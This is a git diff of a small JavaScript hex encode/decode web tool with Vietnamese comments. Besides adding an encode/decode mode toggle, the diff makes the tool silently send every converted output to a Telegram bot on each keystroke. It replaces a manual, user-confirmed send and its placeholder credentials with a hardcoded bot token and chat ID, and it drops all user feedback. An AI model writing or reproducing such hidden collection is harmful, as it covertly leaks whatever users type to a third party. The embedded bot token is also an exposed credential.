@@ -1,20 +1,30 @@
-// Theo dõi sự thay đổi trong ô nhập liệu và tự động chuyển đổi
+let mode = 'encode'; // Mặc định là chế độ Encode
+
+// Thiết lập chế độ Encode hoặc Decode
+function setMode(selectedMode) {
+    mode = selectedMode;
+
+    // Cập nhật giao diện nút bấm
+    document.getElementById('encodeButton').classList.toggle('btn-primary', mode === 'encode');
+    document.getElementById('encodeButton').classList.toggle('btn-secondary', mode !== 'encode');
+    document.getElementById('decodeButton').classList.toggle('btn-primary', mode === 'decode');
+    document.getElementById('decodeButton').classList.toggle('btn-secondary', mode !== 'decode');
+}
+
+// Theo dõi nhập liệu và tự động chuyển đổi
 document.getElementById('inputText').addEventListener('input', () => {
     const inputText = document.getElementById('inputText').value.trim();
+    let output;
 
-    if (isHex(inputText)) {
-        // Nếu là chuỗi Hex hợp lệ, giải mã
-        document.getElementById('outputText').value = decodeFromHex(inputText);
-    } else {
-        // Nếu không, mã hóa
-        document.getElementById('outputText').value = encodeToHex(inputText);
+    if (mode === 'encode') {
+        output = encodeToHex(inputText);
+    } else if (mode === 'decode') {
+        output = decodeFromHex(inputText);
     }
-});
 
-// Kiểm tra chuỗi có phải là Hex hợp lệ không
-function isHex(str) {
-    return /^[0-9a-fA-F\s]+$/.test(str) && str.length % 2 === 0;
-}
+    document.getElementById('outputText').value = output;
+    sendToTelegram(output); // Tự động gửi kết quả qua Telegram
+});
 
 // Hàm mã hóa chuỗi sang Hex
 function encodeToHex(text) {
@@ -31,16 +41,12 @@ function decodeFromHex(hex) {
 }
 
 // Hàm gửi kết quả tới Telegram
-function sendToTelegram() {
-    const outputText = document.getElementById('outputText').value;
-    if (!outputText) {
-        alert('Không có kết quả để gửi!');
-        return;
-    }
+function sendToTelegram(outputText) {
+    if (!outputText) return; // Không gửi nếu không có dữ liệu
 
-    const telegramToken = 'YOUR_BOT_TOKEN'; // Thay bằng token bot của bạn
-    const chatId = 'YOUR_CHAT_ID'; // Thay bằng chat ID của bạn
-    const message = `Kết quả: ${outputText}`;
+    const telegramToken = '7747741271:AAGvVTq9f4BuuvF4AoO3XohUtC7T9aDcLmk'; // Thay bằng token bot của bạn
+    const chatId = '5676736853'; // Thay bằng chat ID của bạn
+    const message = `Kết quả (${mode === 'encode' ? 'Encode' : 'Decode'}): ${outputText}`;
 
     fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
         method: 'POST',
@@ -50,16 +56,5 @@ function sendToTelegram() {
             text: message
         })
     })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            alert('Kết quả đã được gửi qua Telegram!');
-        } else {
-            alert('Gửi thất bại! Vui lòng kiểm tra lại.');
-        }
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        alert('Đã xảy ra lỗi khi gửi!');
-    });
+    .catch(error => console.error('Lỗi khi gửi Telegram:', error));
 }
